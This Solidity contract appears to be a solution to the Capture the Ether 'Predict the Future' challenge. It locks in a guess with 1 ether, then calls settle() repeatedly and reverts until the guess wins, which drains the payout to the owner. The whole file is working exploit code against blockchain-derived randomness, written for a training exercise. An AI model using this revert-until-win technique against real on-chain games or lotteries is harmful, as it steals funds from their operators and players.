// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

//used help from https://github.com/MrToph/capture-the-ether/blob/master/contracts/lotteries/PredictTheFuture.sol

interface Predictable {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract Solver {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function shutdown() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function lockInGuess(uint8 guess, address predictableAddress) external {
        require(address(this).balance >= 1 ether, "contract needs to be funded first");
        Predictable predictable = Predictable(predictableAddress);
        predictable.lockInGuess{value:1 ether}(guess);
    }

    //call this multiple times, until transaction successful
    function solve(address predictableAddress) public payable{
        Predictable predictable = Predictable(predictableAddress);
        predictable.settle();

        require(predictable.isComplete(), "completion failed");

        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}